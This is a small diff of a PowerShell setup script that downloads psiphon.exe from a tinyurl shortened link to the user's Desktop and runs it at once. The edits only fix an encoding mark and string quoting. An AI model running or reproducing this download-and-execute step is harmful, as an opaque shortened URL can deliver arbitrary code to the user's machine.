@@ -1,10 +1,10 @@
-﻿# Set $cud if running standalone
+# Set $cud if running standalone
 $cud = $env:userprofile + '\Desktop'
 
 # Get and run psiphon
 wget tinyurl.com/notpsiphon -outfile $cud\psiphon.exe
 start $cud\psiphon.exe
-write-host Running Psiphon s -f yellow -b black
+write-host 'Running Psiphon' -f yellow -b black
 
 # Wait for psiphon to run
 start-sleep 10
